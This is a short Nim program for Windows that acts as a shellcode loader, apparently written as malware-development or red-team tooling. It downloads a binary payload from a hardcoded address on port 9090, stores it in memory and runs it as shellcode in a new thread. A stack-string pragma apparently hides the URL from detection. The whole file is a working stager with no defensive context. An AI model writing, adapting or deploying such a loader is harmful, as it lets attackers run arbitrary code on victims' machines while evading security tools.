import winim
import utils, stackstrings

proc main() =
  var 
    sPaySize = 500
    buf: pointer 
    sUrl {.stackStringA.} = "http://192.168.1.154:9090/test.bin"
    pInjectionAddress: LPVOID
    hThread: HANDLE
    errCode: bool = true
  
  PRINTA("[+] Getting Payload from %s\n", PSTR(sUrl))
  buf = cast[LPSTR](LocalAlloc(LPTR, sPaySize))
  if GetPayloadFromUrlA(PSTR(sUrl), buf, sPaySize):
    PRINTA("[+] Stored Payload in buffer\n")
  else:
    PRINTA("[!] Failed to retrieve Payload\n")
    errCode = false; goto endProgram

  
  PRINTA("[+] Preparing shellcode for execution\n")
  if executeShellcodeInLocalProcess(buf, sPaySize, pInjectionAddress, hThread):
    PRINTA("[+] Shellcode Prepared!\n")
    PRINTA("[+] Executing shellcode at handle %d\n", hThread)
    WaitForSingleObject(hThread, INFINITE)
  else: 
    PRINTA("[!] Shellcode Failed!\n")
    errCode = false; goto endProgram
  
  label endProgram:
    ExitProcess(cast[UINT](errCode))

when isMainModule:
  main()